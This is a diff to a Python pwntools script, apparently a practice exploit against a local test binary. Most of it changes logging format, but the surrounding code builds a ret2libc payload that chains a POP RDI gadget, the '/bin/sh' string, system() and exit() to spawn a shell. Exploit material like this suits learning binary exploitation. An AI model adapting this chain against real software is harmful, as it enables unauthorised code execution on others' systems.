@@ -1,5 +1,4 @@
 from pwn import *
-# sudo sysctl -w kernel.core_pattern=core
 #context.log_level = 'debug'
 elf = ELF("./tests/ret")
 rop = ROP(elf)
@@ -64,10 +63,10 @@ BINSH = next(libc.search(b"/bin/sh"))
 SYSTEM = libc.sym["system"]
 EXIT = libc.sym["exit"]
 
-log.info("POP_RDI @ %s " % hex(POP_RDI+libcbase))
-log.info("/bin/sh @ %s " % hex(BINSH+libcbase))
-log.info("system @ %s " % hex(SYSTEM+libcbase))
-log.info("exit @ %s " % hex(EXIT+libcbase))
+log.info(f"POP_RDI @ {hex(POP_RDI+libcbase)}")
+log.info(f"/bin/sh @ {hex(BINSH+libcbase)}")
+log.info(f"system @ {hex(SYSTEM+libcbase)}")
+log.info(f"exit @ {hex(EXIT+libcbase)}")
 
 payload2 = b"A"*OFFSET + p64(POP_RDI+libcbase) + p64(BINSH+libcbase) + p64(SYSTEM+libcbase) + p64(EXIT+libcbase)
 
